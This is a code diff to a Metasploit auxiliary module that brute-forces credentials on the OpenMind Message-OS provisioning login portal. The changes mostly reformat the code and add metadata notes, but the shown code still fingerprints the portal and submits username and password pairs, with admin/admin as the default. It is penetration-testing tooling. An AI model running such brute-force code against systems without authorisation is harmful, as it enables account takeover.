@@ -9,20 +9,26 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'OpenMind Message-OS Portal Login Brute Force Utility',
-      'Description'    => %{
-        This module scans for OpenMind Message-OS provisioning web login portal, and
-        performs a login brute force attack to identify valid credentials.
-      },
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'OpenMind Message-OS Portal Login Brute Force Utility',
+        'Description' => %q{
+          This module scans for OpenMind Message-OS provisioning web login portal, and
+          performs a login brute force attack to identify valid credentials.
+        },
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
         ],
-      'License'        => MSF_LICENSE
-
-    ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -30,7 +36,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETURI', [true, "URI for Web login", "/provision/index.php"]),
         OptString.new('USERNAME', [true, "A specific username to authenticate as", "admin"]),
         OptString.new('PASSWORD', [true, "A specific password to authenticate with", "admin"])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -51,10 +58,11 @@ class MetasploitModule < Msf::Auxiliary
   def is_app_openmind?
     begin
       res = send_request_cgi(
-      {
-        'uri'       => '/',
-        'method'    => 'GET'
-      })
+        {
+          'uri' => '/',
+          'method' => 'GET'
+        }
+      )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       vprint_error("HTTP Connection Failed...")
       return false
@@ -103,15 +111,16 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
       res = send_request_cgi(
-      {
-        'uri'       => target_uri.to_s,
-        'method'    => 'POST',
-        'vars_post' =>
-          {
-            'f_user' => user,
-            'f_pass' => pass
-          }
-      })
+        {
+          'uri' => target_uri.to_s,
+          'method' => 'POST',
+          'vars_post' =>
+            {
+              'f_user' => user,
+              'f_pass' => pass
+            }
+        }
+      )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       vprint_error("HTTP Connection Failed...")
       return :abort
@@ -131,6 +140,5 @@ class MetasploitModule < Msf::Auxiliary
     else
       vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
     end
-
   end
 end
